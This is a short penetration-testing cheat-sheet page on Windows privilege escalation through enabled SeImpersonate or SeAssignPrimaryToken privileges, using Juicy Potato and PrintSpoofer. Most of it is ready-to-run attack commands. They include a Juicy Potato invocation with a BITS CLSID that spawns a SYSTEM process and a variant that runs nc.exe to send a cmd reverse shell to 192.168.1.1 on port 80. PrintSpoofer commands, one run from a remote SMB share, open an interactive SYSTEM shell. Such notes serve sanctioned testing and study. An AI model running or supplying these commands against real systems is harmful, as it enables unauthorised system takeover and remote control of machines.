---
description: SeImpersonateToken or SeAssignPrimaryToken - Enabled
---

# SeImpersonateToken

### Exploiting with Juicy Potato

[http://ohpe.it/juicy-potato/\
http://ohpe.it/juicy-potato/CLSID\
https://github.com/ivanitlearning/Juicy-Potato-x86/releases](http://ohpe.it/juicy-potato/http://ohpe.it/juicy-potato/CLSIDhttps://github.com/ivanitlearning/Juicy-Potato-x86/releases)

We need to specify CLSID value with systeminfo. It changes with Windows versions.

```
LocalService CLSID
BITS	{4991d34b-80a1-4291-83b6-3328366b9097}	NT AUTHORITY\SYSTEM

Checking...
JuicyPotatox86.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
[+] CreateProcessWithTokenW OK

JuicyPotatox86.exe -l 1337 -p C:\windows\temp\nc.exe -a "-e cmd 192.168.1.1 80" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### Exploiting with PrintSpoofer.exe

The target machine's arch is need to be x64.

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```
PrintSpoofer.exe -i -c cmd
\\192.168.1.1\Share\PrintSpoofer.exe -i -c cmd
```
